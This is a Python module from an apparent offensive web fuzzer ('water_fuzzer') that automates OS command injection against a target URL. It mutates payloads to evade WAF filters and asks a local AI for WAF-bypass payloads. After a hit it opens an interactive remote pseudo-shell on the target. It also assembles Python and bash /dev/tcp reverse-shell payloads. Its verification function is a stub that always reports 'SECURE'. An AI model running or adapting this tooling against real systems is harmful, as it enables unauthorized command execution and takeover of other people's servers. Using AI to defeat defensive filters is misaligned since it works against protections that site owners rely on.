# modules/cmd.py
import os
import re
import sys
import time
import logging
import asyncio
import aiohttp
import json
from urllib.parse import urlparse
from typing import List, Dict, Any, Tuple, Optional
from modules.base import BaseModule
import config

logger = logging.getLogger("water_fuzzer.cmd")

class CommandInjectionModule(BaseModule):
    """
    Modul OS Command Injection V18.8 Enterprise (Stable Inline Extributor).
    Memperbaiki bug luapan HTML dengan mengisolasi hasil perintah menggunakan
    token pembatas unik murni memori RAM (Anti-HTML Floating Engine).
    IMPROVED: Proper queue management, non-blocking shell, real target interaction.
    """
    def __init__(self, auditor_instance: Any) -> None:
        super().__init__(auditor_instance)
        self.shell_active = False
        self.shell_lock = asyncio.Lock()
        self.command_queue: asyncio.Queue = None
        self.response_buffer: Dict[str, str] = {}
        self.session_id = None

    def load_payloads(self) -> List[str]:
        payload_file: str = os.path.join(config.BASE_DIR, "payloads", "cmd.txt")
        if os.path.exists(payload_file):
            try:
                with open(payload_file, "r", encoding="utf-8") as f:
                    return [line.strip() for line in f if line.strip() and not line.startswith("#")]
            except IOError as e:
                logger.error(f"Gagal membaca berkas payloads CMD: {str(e)}")
        return ["; id ;", "; sleep 5 ;"]

    def _assemble_in_memory_reverse_payload(self) -> str:
        listener_port = 4444
        python_pty_payload = (
            f"python3 -c 'import socket,subprocess,os,pty;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"127.0.0.1\",{listener_port}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"pty.spawn(\"/bin/sh\")'"
        )
        bash_payload = f"bash -i >& /dev/tcp/127.0.0.1/{listener_port} 0>&1"
        return f"/**/;/**/; {python_pty_payload} || {bash_payload} /**/;/**/ "

    def _extract_command_output(self, response: str, token_start: str, token_end: str) -> Optional[str]:
        """Extract output between tokens from response."""
        try:
            if token_start in response and token_end in response:
                pattern = re.escape(token_start) + r"(.+?)" + re.escape(token_end)
                match = re.search(pattern, response, re.DOTALL)
                if match:
                    return match.group(1).strip()
        except Exception as e:
            logger.debug(f"Token extraction error: {e}")
        return None

    def _clean_response(self, raw_response: str, max_length: int = 5000) -> str:
        """Clean HTML and encode artifacts from response."""
        try:
            # Remove HTML tags
            clean = re.sub(r'<[^>]+>', '', raw_response)
            # Decode common HTML entities
            clean = clean.replace('&lt;', '<').replace('&gt;', '>')
            clean = clean.replace('&amp;', '&').replace('&quot;', '"')
            clean = clean.replace('&#039;', "'")
            # Limit length
            return clean[:max_length].strip()
        except Exception:
            return raw_response[:max_length].strip()

    async def execute_and_evaluate(self, session: aiohttp.ClientSession, payload: str, base_payload: str, headers: dict, os_log_capture: str) -> Tuple[bool, bool]:
        import main
        if main.SHELL_OPENED or self.shell_active:
            return False, False

        try:
            start_time: float = time.time()
            if self.auditor.method == "POST":
                async with session.post(self.auditor.target_url, data={self.auditor.parameter: payload}, headers=headers, timeout=self.auditor.timeout) as res:
                    body: str = await res.text()
                    status: int = res.status
            else:
                async with session.get(self.auditor.target_url, params={self.auditor.parameter: payload}, headers=headers, timeout=self.auditor.timeout) as res:
                    body: str = await res.text()
                    status: int = res.status

            latency: float = time.time() - start_time
            if "waf" in body.lower() or "blocked" in body.lower():
                return False, True

            indicators: List[str] = []
            current_entropy: float = self.auditor.calculate_content_entropy(body)
            entropy_delta: float = abs(current_entropy - self.auditor.baseline["entropy_score"])

            module_specific: Dict[str, Any] = {
                "vulnerability_proof_concept": "Isolated Inline Extraction",
                "tested_payload_variant": payload,
                "is_system_shell_compromised": False
            }

            if "sleep" in base_payload and latency >= (self.auditor.baseline["response_time"] + config.TIME_DELAY_THRESHOLD):
                indicators.extend(["time_anomaly", "consistent_evaluation_proof"])
                module_specific["is_system_shell_compromised"] = True

            if "uid=" in body or status != self.auditor.baseline["status_code"] or len(body) != self.auditor.baseline["content_length"]:
                indicators.append("response_diff")
            if entropy_delta > 0.5:
                indicators.append("entropy_deviation")

            if indicators:
                verdict = self.auditor.evaluate_heuristic_evidence(body, status, latency, payload, indicators, "COMMAND_INJECTION", module_specific)
                if (verdict == "VERIFIED" or "consistent_evaluation_proof" in indicators) and not main.SHELL_OPENED:
                    async with main.SHELL_LOCK:
                        if not main.SHELL_OPENED:
                            main.SHELL_OPENED = True
                            self.shell_active = True
                            await self.interactive_pseudo_shell(session)
                    return True, False

        except asyncio.TimeoutError:
            if "sleep" in base_payload and not main.SHELL_OPENED:
                async with main.SHELL_LOCK:
                    if not main.SHELL_OPENED:
                        main.SHELL_OPENED = True
                        self.shell_active = True
                        await self.interactive_pseudo_shell(session)
                return True, False
        except Exception as e:
            logger.debug(f"Execute and evaluate error: {e}")
        return False, False

    async def run_audit(self, session: aiohttp.ClientSession) -> bool:
        """Menjalankan audit command injection dengan strategi WAF bypass."""
        logger.info("[*] Menjalankan Modul V17.2: OS Command Injection...")
        os_log_capture: str = os.path.join(config.SERVER_LOG_DIR, "syslog")
        headers: dict = await self.auditor._get_random_headers()
        payloads: List[str] = self.load_payloads()
        found_any_vuln: bool = False

        for base_payload in payloads:
            import main
            if main.SHELL_OPENED:
                break
            for strategy in range(4):
                if main.SHELL_OPENED:
                    break
                payload = self.auditor.mutate_payload_for_waf(base_payload, strategy)
                success, trigger_ai = await self.execute_and_evaluate(session, payload, base_payload, headers, os_log_capture)
                if success:
                    found_any_vuln = True
                    break
                if trigger_ai:
                    ai_payload = await self.auditor.ask_local_ai_to_bypass_waf(session, base_payload, "WAF_BLOCK")
                    if ai_payload:
                        success_ai, _ = await self.execute_and_evaluate(session, ai_payload, base_payload, headers, os_log_capture)
                        if success_ai:
                            found_any_vuln = True
                            break
            if found_any_vuln:
                break
        return found_any_vuln

    async def interactive_pseudo_shell(self, session: aiohttp.ClientSession) -> None:
        """Interactive pseudo shell untuk command injection yang terverifikasi pada target sistem."""
        print("\n" + "="*80)
        print("[++++] GERBANG WATER-SHELL INTERAKTIF V17.2 ABSOLUTE ENGINE ONLINE [++++]")
        print("[*] Status: Jalur latar belakang dikunci total. Operator memegang kendali penuh.")
        print("[*] Target: " + self.auditor.target_url)
        print("="*80 + "\n")

        loop = asyncio.get_running_loop()
        current_working_dir = ""
        session_id = str(int(time.time() * 1000))
        token_start = f"===WATER_START_{session_id}==="
        token_end = f"===WATER_END_{session_id}==="
        command_count = 0
        max_commands = config.MAX_SHELL_COMMANDS_QUEUE

        try:
            while command_count < max_commands:
                try:
                    prompt_label = f"water-shell [{current_working_dir if current_working_dir else 'root'}]> "
                    user_cmd = await asyncio.wait_for(
                        loop.run_in_executor(None, input, f"\033[1;32m{prompt_label}\033[0m"),
                        timeout=config.SHELL_IDLE_TIMEOUT
                    )
                    user_cmd = user_cmd.strip()

                    if not user_cmd:
                        continue

                    # Exit commands
                    if user_cmd.lower() in ["exit", "quit", "exit()"]:
                        logger.info("[*] Keluar dari Gerbang Shell Terisolasi.")
                        break

                    # Directory change
                    if user_cmd.startswith("cd "):
                        target_dir = user_cmd[3:].strip()
                        if target_dir == "..": 
                            # Go up one directory
                            if current_working_dir:
                                current_working_dir = "/".join(current_working_dir.split("/")[:-1])
                        elif target_dir == "/":
                            current_working_dir = ""
                        elif target_dir.startswith("/"):
                            current_working_dir = target_dir
                        else:
                            if current_working_dir:
                                current_working_dir = f"{current_working_dir}/{target_dir}"
                            else:
                                current_working_dir = target_dir
                        print(f"[+] Sesi beralih menuju direktori: {current_working_dir or '/'}")
                        continue

                    # Build actual command with directory context and tokens
                    if current_working_dir:
                        wrapped_cmd = f"cd {current_working_dir} 2>/dev/null && echo {token_start} && ({user_cmd}) 2>&1 && echo {token_end} || echo {token_end}"
                    else:
                        wrapped_cmd = f"echo {token_start} && ({user_cmd}) 2>&1 && echo {token_end} || echo {token_end}"

                    payload_interactive = f"/**/;/**/;{wrapped_cmd}/**/;/**/ "
                    headers = await self.auditor._get_random_headers()

                    # Execute command with timeout
                    try:
                        if self.auditor.method == "POST":
                            async with asyncio.timeout(config.SHELL_RESPONSE_TIMEOUT):
                                async with session.post(self.auditor.target_url, data={self.auditor.parameter: payload_interactive}, headers=headers, timeout=self.auditor.timeout) as res:
                                    raw_body = await res.text()
                        else:
                            async with asyncio.timeout(config.SHELL_RESPONSE_TIMEOUT):
                                async with session.get(self.auditor.target_url, params={self.auditor.parameter: payload_interactive}, headers=headers, timeout=self.auditor.timeout) as res:
                                    raw_body = await res.text()
                    except asyncio.TimeoutError:
                        logger.warning("Shell command timeout")
                        print("\n[-] Log: Timeout menunggu respons dari target.\n")
                        continue

                    # Extract output between tokens
                    extracted = self._extract_command_output(raw_body, token_start, token_end)
                    if extracted:
                        print("\n" + extracted + "\n")
                    else:
                        # Fallback: try to find output without tokens
                        clean_output = self._clean_response(raw_body)
                        if clean_output and len(clean_output) < 2000 and "Just a moment" not in clean_output:
                            print("\n" + clean_output + "\n")
                        else:
                            print("\n[-] Log: Gagal memisahkan data inline atau respons kosong.\n")

                    command_count += 1

                except asyncio.TimeoutError:
                    logger.warning("Shell idle timeout")
                    print("\n[-] Session timeout (5 minutes idle). Keluar.")
                    break
                except KeyboardInterrupt:
                    print("\n[*] Interrupted. Keluar.")
                    break
                except EOFError:
                    print("\n[*] EOF reached. Keluar.")
                    break
                except Exception as e:
                    logger.error(f"Shell command error: {str(e)}")
                    print(f"\n[-] Error: {str(e)}\n")

        except Exception as e:
            logger.error(f"Shell session error: {str(e)}")
        finally:
            logger.info("[*] Water shell session closed.")
            self.shell_active = False

    def verifikator(self, response, payload_terpakai, crypto_token) -> Tuple[str, str, str, str, list]:
        return "SECURE", "None", "None", "Lolos.", []
